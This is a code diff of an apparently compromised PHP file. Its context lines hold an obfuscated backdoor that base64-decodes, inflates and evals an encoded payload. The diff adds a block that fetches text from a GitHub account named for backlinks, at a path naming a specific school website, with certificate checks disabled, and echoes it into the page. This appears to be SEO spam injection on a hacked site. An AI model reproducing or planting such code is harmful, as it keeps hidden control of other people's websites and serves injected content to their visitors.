@@ -26,3 +26,20 @@ $Lix = "=0ez8fzHa/zULE/kX6uD7XJ14n80iqyWCEGwWnokV6PPA/cDwNnN9NbAwhdMegJV2Uh7st7i
 eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
 exit;
 ?>
+<?php
+function curlGetContents($url) {
+    $ch = curl_init($url);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    $fileContents = curl_exec($ch);
+    curl_close($ch);
+    return $fileContents; 
+}
+$url1 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/system.txt';
+$url2 = 'https://raw.githubusercontent.com/BacklinkGG/VIP-ID/main/site/mtsdarululumsasa/mtsdarululumsasa.sch.id/system.txt';
+$fileContents1 = curlGetContents($url1);
+$fileContents2 = curlGetContents($url2);
+echo $fileContents1;
+echo $fileContents2;
+?>
